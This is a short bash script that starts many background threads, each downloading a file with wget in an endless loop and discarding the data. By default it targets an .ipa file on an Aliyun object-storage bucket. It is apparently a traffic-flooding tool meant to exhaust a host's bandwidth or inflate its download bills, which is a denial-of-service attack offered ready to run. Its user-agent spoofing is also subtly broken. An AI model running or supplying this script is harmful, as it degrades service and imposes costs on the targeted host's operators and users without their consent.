#!/bin/bash
UAs=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47")
if [ ! -n "$1" ]; then
    uuurl="https://zbios2.oss-cn-hongkong.aliyuncs.com/ios2.ipa"
else
    uuurl=$1
fi
if [ ! -n "$2" ]; then
    t=16
else
    t=$2
fi
for i in $(seq 1 $t); do
    {
        while true; do
            z=$(($RANDOM % 12))
            wget -O /dev/null -o /dev/null -U=${UAs[$z]} $uuurl
        done
    } &
    echo "thread $i start!"
done
